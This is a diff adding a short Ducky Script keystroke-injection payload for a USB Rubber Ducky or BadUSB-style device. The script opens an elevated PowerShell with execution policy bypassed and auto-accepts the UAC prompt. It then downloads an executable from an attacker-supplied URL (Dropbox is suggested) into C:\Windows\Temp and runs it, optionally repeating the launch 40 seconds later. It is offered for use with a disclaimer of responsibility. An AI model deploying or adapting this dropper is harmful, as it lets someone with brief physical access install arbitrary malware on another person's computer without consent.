@@ -1,0 +1,48 @@
+REM created by LongTimeNoC
+REM I hold no responsibility for its use 
+REM V1
+
+REM replace the "url" with desired address (using dropbox replace last digit (0) with a 1)
+REM also replace 'example.exe' with exe file name!
+REM the delay can be increased if the machine is slow 
+
+
+DELAY 200
+GUI d 
+DELAY 400 
+GUI r 
+DELAY 450 
+STRING powershell -NoP -Ep Bypass
+ENTER 
+ALT y
+DELAY 850
+STRING Set-WinUserLanguageList -LanguageList en-US -Force
+DELAY 200 
+ENTER
+DELAY 850
+
+REM Downloading and installing exe script:
+
+STRING $url = "url-keep quotation marks"; $output = "C:\Windows\Temp\example.exe"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath "C:\Windows\Temp\example.exe"; exit
+DELAY 400
+ENTER
+GUI d
+
+REM To ensure it has been installed - This is optional delete if you do not want this:
+
+DELAY 40000
+GUI r
+DELAY 400
+STRING powershell -NoP -Ep Bypass
+DELAY 400
+ENTER 
+ALT y
+DELAY 900
+STRING Set-WinUserLanguageList -LanguageList en-US -Force
+DELAY 200 
+ENTER
+DELAY 900
+STRING Start-Process -FilePath "C:\Windows\Temp\example.exe"; exit
+DELAY 400
+ENTER
+GUI d
